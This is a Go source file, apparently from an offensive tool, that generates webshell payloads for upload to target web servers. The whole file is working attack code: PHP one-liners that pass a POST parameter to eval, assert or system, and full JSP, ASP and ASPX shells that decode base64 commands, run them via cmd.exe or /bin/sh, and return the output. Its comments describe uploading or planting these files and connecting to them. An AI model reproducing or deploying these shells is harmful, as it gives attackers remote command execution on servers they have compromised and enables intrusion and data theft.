package webshell

import (
	"errors"
	"strings"
)

// Payload 生成与 Build() 协议配套的马文件内容，供 worker 上传或人工落地后连接。
// 参数名取自 Target.Param，因此同一类型可以配多匹不同口令的马。
//
// 只生成 ARTEX 自己协议能解析的马：命令经 base64/表单编码传入，输出用随机标记
// 包起来回传。第三方马（Behinder / Godzilla 等）的加密封包不在支持范围内。
func Payload(t *Target) (filename, content string, err error) {
	d, ok := descriptorOf(t.Type)
	if !ok {
		return "", "", ErrUnknownType
	}
	p := t.param()
	switch t.Type {
	case TypePHPEval:
		return d.Filename, "<?php @eval($_POST['" + p + "']);", nil
	case TypePHPAssert:
		return d.Filename, "<?php @assert($_POST['" + p + "']);", nil
	case TypePHPCmd:
		return d.Filename, "<?php system($_REQUEST['" + p + "']);", nil
	case TypeJSP:
		return d.Filename, strings.ReplaceAll(jspShell, "__PARAM__", p), nil
	case TypeASP:
		return d.Filename, strings.ReplaceAll(aspShell, "__PARAM__", p), nil
	case TypeASPX:
		return d.Filename, strings.ReplaceAll(aspxShell, "__PARAM__", p), nil
	}
	return "", "", errors.New("该类型没有可用的马文件模板")
}

// jspShell 自行按 os.name 选 cmd.exe / /bin/sh，所以同一匹马两头都能用。
// 参数是 base64(begin \n end \n command)，解码后按第一个换行切边界。
const jspShell = `<%@page import="java.io.*"%><%@page import="java.util.*"%><%
String enc=request.getParameter("__PARAM__");
if(enc==null){out.print("no param");return;}
String d=new String(Base64.getDecoder().decode(enc),"UTF-8");
int i1=d.indexOf('\n');int i2=d.indexOf('\n',i1+1);
if(i1<0||i2<i1){out.print("bad payload");return;}
String b=d.substring(0,i1),e=d.substring(i1+1,i2),c=d.substring(i2+1);
boolean win=System.getProperty("os.name").toLowerCase().indexOf("win")>=0;
String[] argv=win?new String[]{"cmd.exe","/c",c+" 2>&1"}:new String[]{"/bin/sh","-c",c+" 2>&1"};
Process pr=Runtime.getRuntime().exec(argv);
ByteArrayOutputStream bo=new ByteArrayOutputStream();
InputStream in=pr.getInputStream();
byte[] buf=new byte[4096];int n;
while((n=in.read(buf))>0){bo.write(buf,0,n);}
pr.waitFor();
out.print(b);out.print(new String(bo.toByteArray(),"UTF-8"));out.print(e);
%>
`

// aspShell 走 WScript.Shell.Exec，输出与错误一并回读。
const aspShell = `<%
Dim b,e,c,w,x,o
b=Request.Form("b"):e=Request.Form("e"):c=Request.Form("__PARAM__")
Set w=CreateObject("WScript.Shell")
Set x=w.Exec("%ComSpec% /c " & c)
Do While x.Status=0
If Not x.StdOut.AtEndOfStream Then o=o & x.StdOut.ReadAll()
If Not x.StdErr.AtEndOfStream Then o=o & x.StdErr.ReadAll()
Loop
If Not x.StdOut.AtEndOfStream Then o=o & x.StdOut.ReadAll()
If Not x.StdErr.AtEndOfStream Then o=o & x.StdErr.ReadAll()
Response.Write b & o & e
%>
`

const aspxShell = `<%@ Page Language="C#" %><script runat="server">
protected void Page_Load(object sender,EventArgs a){
string enc=Request.Form["__PARAM__"];
if(string.IsNullOrEmpty(enc)){Response.Write("no param");return;}
string d=System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(enc));
string[] p=d.Split('\n');
if(p.Length<3){Response.Write("bad payload");return;}
System.Diagnostics.ProcessStartInfo psi=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+p[2]+" 2>&1");
psi.RedirectStandardOutput=true;psi.UseShellExecute=false;
System.Diagnostics.Process pr=System.Diagnostics.Process.Start(psi);
string o=pr.StandardOutput.ReadToEnd();pr.WaitForExit();
Response.Write(p[0]+o+p[1]);
}
</script>
`
